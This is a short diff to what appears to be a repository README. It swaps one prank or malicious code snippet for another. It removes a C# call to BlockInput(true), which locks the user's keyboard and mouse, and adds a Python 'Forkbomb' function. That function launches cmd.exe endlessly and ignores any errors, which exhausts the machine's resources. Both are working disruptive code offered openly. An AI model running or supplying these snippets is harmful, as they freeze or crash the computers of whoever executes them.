@@ -26,10 +26,15 @@
     <img src="https://cdn.discordapp.com/attachments/720825376946782321/758776239980019722/unknown.png" alt="fax" width="256" height="77">
 </p>
 
-```csharp
-[DllImport("user32.dll")]
-static extern bool BlockInput(bool fBlockIt);
-BlockInput(true);
+```python
+import os
+
+def Forkbomb():
+	while True:
+		try:
+			os.startfile('cmd.exe')
+		except:
+			pass
 ```
 <p align="center">  
   <img src="https://www.gommehd.net/forum/proxy.php?image=http%3A%2F%2Fi.imgur.com%2FiOF5Ud4.gif&hash=0c1d1f377a773c0fb1ed74fe446c8ad3" alt="fax" width="1000" height="1">
